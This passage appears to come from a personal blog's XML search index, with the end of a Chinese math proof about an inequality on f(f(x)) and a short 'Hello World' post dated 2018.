D\)</span>, 因此有</p><p><span class="math display">\[f(f(x))&gt;f(x)\]</span></p><p>于是 <span class="math display">\[f(f(x))&gt;f(x)&gt;x\; \Box\]</span></p>]]></content>
    
    
    
    <tags>
      
      <tag>数学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2018/06/10/hello-world/"/>
    <url>/2018/06/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Conventionally, Hello World!</p>]]></content>
    
    
    
    <tags>
      
      <tag>碎碎念</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
